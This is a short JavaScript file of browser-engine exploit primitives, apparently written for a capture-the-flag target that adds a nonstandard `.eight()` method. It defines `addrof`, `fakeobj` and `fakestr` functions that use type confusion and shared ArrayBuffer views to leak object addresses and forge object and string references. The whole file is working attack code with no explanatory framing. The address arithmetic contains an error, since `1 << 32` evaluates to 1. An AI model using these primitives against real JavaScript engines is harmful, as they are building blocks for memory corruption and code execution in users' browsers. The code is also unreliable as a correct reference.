let bits = new ArrayBuffer(1000);
let floatview = new Float64Array(bits);
let bitview = new Uint32Array(bits);
const temp = Math.pow(2,32);

let addrof = function(obj){
    
    // Create our variables
    let first = {"int" : 420, "object" : obj};
    first.eight();
    let second = {"val" : first.int, "floattag" : 7};
    second.eight();
    
    // save val and reshift
    floatview[0] = second.val;
    first.eight();
    second.eight();
    
    // Shift and return
    let firsthalf = bitview[1] * (1 << 32);
    return firsthalf + bitview[0];
};
let fakeobj = function(addr){
    
    // Save addr
    bitview[1] = Math.floor(addr/temp);
    let addrint = parseInt(addr);
    bitview[0] = addrint;
    
    // Create our variables
    let first = {"int" : 420, "object" : floatview[0]};
    first.eight();
    let second = {"val" : first.int, "objtag" : -1};
    second.eight();
    
    // sav val, reshift and return
    let result = second.val;
    first.eight();
    second.eight();
    return result;
};

let fakestr = function(addr){
    
    // Save addr
    bitview[1] = Math.floor(addr/temp);
    let addrint = parseInt(addr);
    bitview[0] = addrint;
    
     // Create our variables
    let first = {"int" : 420, "object" : floatview[0]};
    first.eight();
    let second = {"val" : first.int, "strtag" : -7};
    second.eight();
    
    // sav val, reshift and return
    let result = second.val;
    first.eight();
    second.eight();
    return result;
};
